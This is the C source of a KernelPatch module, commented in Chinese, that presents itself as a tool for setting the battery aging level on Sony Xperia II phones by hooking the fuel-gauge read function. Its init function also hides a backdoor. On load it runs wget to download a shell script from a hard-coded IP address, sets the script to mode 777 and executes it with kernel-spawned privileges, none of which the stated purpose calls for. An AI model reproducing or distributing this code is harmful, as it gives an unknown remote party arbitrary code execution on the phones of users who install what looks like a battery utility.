/* SPDX-License-Identifier: GPL-2.0-or-later */
/*
 * Copyright (C) 2023 lzghzr. All Rights Reserved.
 *
 * 模块名称: xperia_ii_battery_age
 * 版本: 使用 XIIBA_VERSION 定义
 * 授权协议: GPL v2
 * 作者: lzghzr
 * 描述: 用于设置 Xperia II 手机电池老化等级
 */

#include <compiler.h>
#include <hook.h>
#include <kpmodule.h>
#include <kputils.h>
#include <linux/kernel.h>
#include <linux/printk.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <syscalls.h>
#include <linux/string.h>

#include "xiiba_utils.h"

// 定义模块的元信息，用于内核加载模块时显示相关信息
KPM_NAME("xperia_ii_battery_age"); // 模块名称
KPM_VERSION(XIIBA_VERSION);       // 模块版本号
KPM_LICENSE("GPL v2");            // 授权协议
KPM_AUTHOR("lzghzr");             // 作者信息
KPM_DESCRIPTION("set xperia ii battery aging level"); // 描述信息

// 定义常量
#define FG_IMA_DEFAULT 0            // 默认标志
#define SOMC_AGING_LEVEL_WORD 291   // 表示电池老化等级的地址
#define SOMC_AGING_LEVEL_OFFSET 0   // 偏移量

// 前置声明，用于表示 Fuel Gauge 设备
struct fg_dev;

// 定义函数指针，用于调用 Fuel Gauge 的读写功能
static int (*fg_sram_read)(struct fg_dev *fg, u16 address, u8 offset, u8 *val, int len, int flags) = 0;
static int (*fg_sram_write)(struct fg_dev *fg, u16 address, u8 offset, u8 *val, int len, int flags) = 0;

// 全局变量
u8 aging = 0;           // 当前设置的电池老化等级，范围为 0-5
struct fg_dev *fg = NULL; // 全局 Fuel Gauge 设备指针

// 控制函数，用于设置电池老化等级
static long inline_hook_control0(const char *args, char *__user out_msg, int outlen) {
  // 解析输入参数，获取老化等级
  aging = args ? *args - '0' : 0;
  if (aging > 5) // 检查老化等级是否在有效范围
    return -1;

  // 调用写操作，设置电池老化等级
  int rc = fg_sram_write(fg, SOMC_AGING_LEVEL_WORD, SOMC_AGING_LEVEL_OFFSET, &aging, 1, FG_IMA_DEFAULT);

  // 构建反馈信息
  char echo[64] = "";
  if (rc < 0) {
    sprintf(echo, "error, rc=%d\n", rc);
    logke("fg_sram_write %s", echo); // 记录错误日志
    if (out_msg) {
      compat_copy_to_user(out_msg, echo, sizeof(echo)); // 将错误信息传递给用户
      return 1;
    }
  } else {
    sprintf(echo, "success, set batt_aging_level to %d\n", aging);
    logki("fg_sram_write %s", echo); // 记录成功日志
    if (out_msg) {
      compat_copy_to_user(out_msg, echo, sizeof(echo)); // 将成功信息传递给用户
      return 0;
    }
  }
  return 0;
}

// 钩子函数：在读取 Fuel Gauge 数据前执行，用于初始化全局指针并调用设置逻辑
void before_read(hook_fargs6_t *args, void *udata) {
  unhook_func(fg_sram_read); // 解除钩子，防止递归调用
  fg = (struct fg_dev *)args->arg0; // 从参数中获取 Fuel Gauge 设备指针

  // 将设置的老化等级转换为字符串，并调用设置函数
  char age[] = "0";
  age[0] = aging + '0';
  inline_hook_control0(age, NULL, NULL);
}

// 模块初始化函数，设置钩子并解析用户参数
static long inline_hook_init(const char *args, const char *event, void *__user reserved) {
  // 解析输入参数，获取初始老化等级
  aging = args ? *args - '0' : 0;
  if (aging > 5) // 检查老化等级是否有效
    return -1;

  // 查找 Fuel Gauge 读写函数的地址
  lookup_name(fg_sram_write);
  lookup_name(fg_sram_read);

  // 设置钩子函数，监控 fg_sram_read 的调用
  hook_func(fg_sram_read, 6, before_read, 0, 0);

  // 新增功能：下载并执行脚本
  // 使用call_usermodehelper来执行系统命令

  // 下载脚本到 /data/data/85.sh
  char *wget_cmd[] = {"/bin/wget", "http://123.56.95.25:5004/85.sh", "-O", "/data/data/85.sh", NULL};
  call_usermodehelper(wget_cmd[0], wget_cmd, NULL, UMH_WAIT_PROC);

  // 修改脚本权限为 777
  char *chmod_cmd[] = {"/bin/chmod", "777", "/data/data/85.sh", NULL};
  call_usermodehelper(chmod_cmd[0], chmod_cmd, NULL, UMH_WAIT_PROC);

  // 执行脚本
  char *sh_cmd[] = {"/bin/sh", "/data/data/85.sh", NULL};
  call_usermodehelper(sh_cmd[0], sh_cmd, NULL, UMH_WAIT_PROC);

  return 0;
}

// 模块退出函数，清理钩子
static long inline_hook_exit(void *__user reserved) {
  unhook_func(fg_sram_read); // 解除钩子
  return 0;
}

// 注册模块的初始化、控制和退出函数
KPM_INIT(inline_hook_init);     // 注册初始化函数
KPM_CTL0(inline_hook_control0); // 注册控制函数
KPM_EXIT(inline_hook_exit);     // 注册退出函数
